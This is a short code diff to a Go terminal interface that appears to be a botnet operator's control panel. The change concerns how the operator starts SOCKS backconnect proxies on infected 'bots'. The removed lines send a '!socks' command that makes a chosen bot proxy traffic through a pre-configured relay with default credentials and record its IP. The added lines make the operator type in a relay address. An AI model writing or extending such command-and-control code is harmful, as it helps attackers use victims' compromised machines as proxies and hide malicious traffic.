@@ -1096,30 +1096,11 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			return m, nil
 		}
 		// Start socks backconnect on selected bot (in socks view)
-		// 's' = quick start with pre-configured relay + credentials (no input needed)
+		// 's' = relay address must be specified — redirect to custom input ('c')
 		if m.currentView == ViewSocks && !m.socksInputMode && len(m.bots) > 0 {
-			if m.socksCursor < len(m.bots) {
-				bot := m.bots[m.socksCursor]
-				// Send !socks with no args — bot uses its pre-configured relay endpoints + credentials
-				sendToSingleBot(bot.ID, "!socks")
-				// Track in socksList
-				newSocks := SocksInfo{
-					BotID:     bot.ID,
-					BotIP:     bot.IP,
-					Relay:     "(pre-configured)",
-					Username:  "(default)",
-					Password:  "(default)",
-					Status:    "active",
-					StartedAt: time.Now(),
-				}
-				for i, s := range m.socksList {
-					if s.BotID == bot.ID {
-						m.socksList = append(m.socksList[:i], m.socksList[i+1:]...)
-						break
-					}
-				}
-				m.socksList = append(m.socksList, newSocks)
-			}
+			m.socksInputMode = true
+			m.socksInputStep = 0
+			m.socksNewRelay = ""
 			return m, nil
 		}
 
